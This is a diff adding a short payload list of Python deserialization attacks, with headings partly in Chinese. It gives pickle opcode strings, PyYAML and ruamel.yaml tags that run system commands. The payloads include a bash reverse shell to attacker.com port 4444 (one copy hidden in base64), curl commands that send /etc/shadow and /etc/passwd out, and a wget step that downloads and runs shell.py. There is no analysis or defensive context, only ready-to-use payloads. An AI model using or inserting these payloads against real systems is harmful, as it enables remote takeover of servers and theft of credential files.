@@ -1,0 +1,14 @@
+# Python - pickle RCE (反弹 Shell)
+cos\nsystem\n(S'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'\ntR.
+# Python - pickle 写入文件 (exec)
+cos\nsystem\n(S'echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx |base64 -d|bash'\ntR.
+# Python - yaml.unsafe_load RCE
+!!python/object/apply:os.system ["cat /etc/shadow|base64|curl attacker.com -d @-"]
+# Python - PyYAML deserialize_all RCE
+python: !!python/object/apply:subprocess.check_output [["id"]]
+# Python - ruamel.yaml RCE
+!!python/object/new:subprocess.check_output [["cat /etc/passwd"]]
+# Python - NumPy pickle 反序列化 RCE
+cos\nsystem\n(S'curl attacker.com/$(cat /etc/passwd|base64)'\ntR.
+# Python - pandas read_pickle RCE
+cos\nsystem\n(S'wget http://attacker.com/shell.py -O /tmp/shell.py; python3 /tmp/shell.py'\ntR.
